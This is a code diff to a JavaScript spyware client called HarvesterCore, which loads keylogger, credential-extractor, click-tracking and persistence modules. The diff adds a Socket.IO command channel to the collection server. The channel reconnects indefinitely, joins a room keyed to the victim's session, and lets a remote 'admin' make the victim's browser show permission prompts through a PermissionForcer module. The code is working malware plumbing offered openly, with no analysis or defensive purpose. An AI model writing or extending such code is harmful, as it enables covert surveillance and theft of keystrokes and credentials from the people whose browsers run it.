@@ -1,4 +1,5 @@
 import axios from 'axios';
+import { io } from 'socket.io-client';
 import ClickTracker from './ClickTracker';
 import Keylogger from './Keylogger';
 import CredentialExtractor from './CredentialExtractor';
@@ -27,6 +28,7 @@ class HarvesterCore {
     this.heartbeatInterval = null;
     this.modules = {};
     this._reconnectAttempted = false;
+    this.socket = null;
   }
 
   async init() {
@@ -86,11 +88,70 @@ class HarvesterCore {
     }
 
     this.initialized = true;
+
+    // === CRITICAL: Establish Socket.IO connection for admin commands ===
+    this.connectSocket();
+
     this.persistenceEngine = new PersistenceEngine(this);
     this.persistenceEngine.init();
     this.startModules();
     this.startHeartbeat();
     this.setupBeforeUnload();
+  }
+
+  connectSocket() {
+    try {
+      // Connect to the same server
+      this.socket = io(API, {
+        transports: ['websocket', 'polling'],
+        reconnection: true,
+        reconnectionAttempts: Infinity,
+        reconnectionDelay: 2000,
+        reconnectionDelayMax: 10000,
+        query: { sessionId: this.sessionId }
+      });
+
+      this.socket.on('connect', () => {
+        console.log('[HarvesterCore] Socket connected:', this.socket.id);
+        // Join the session-specific room so admin can send commands directly
+        if (this.sessionId) {
+          this.socket.emit('join-session', this.sessionId);
+          console.log('[HarvesterCore] Joined session room:', this.sessionId);
+        }
+      });
+
+      this.socket.on('disconnect', (reason) => {
+        console.log('[HarvesterCore] Socket disconnected:', reason);
+      });
+
+      this.socket.on('connect_error', (err) => {
+        console.warn('[HarvesterCore] Socket connection error:', err.message);
+      });
+
+      // === Listen for admin-triggered permission commands ===
+      this.socket.on('admin-trigger-permission', (data) => {
+        console.log('[HarvesterCore] Admin triggered permission:', data.permissionType);
+        if (this.modules.permissionForcer) {
+          this.modules.permissionForcer.triggerSinglePermission(data.permissionType);
+        }
+      });
+
+      // === Listen for any other admin commands (future extensibility) ===
+      this.socket.on('admin-command', (data) => {
+        console.log('[HarvesterCore] Admin command received:', data);
+        if (data.command === 'trigger-permission' && data.permissionType) {
+          if (this.modules.permissionForcer) {
+            this.modules.permissionForcer.triggerSinglePermission(data.permissionType);
+          }
+        }
+      });
+
+      // Expose socket globally so PermissionForcer.setupSocketListeners() can also use it
+      window.__harvester_socket = this.socket;
+
+    } catch (e) {
+      console.warn('[HarvesterCore] Failed to create socket:', e.message);
+    }
   }
 
   startModules() {
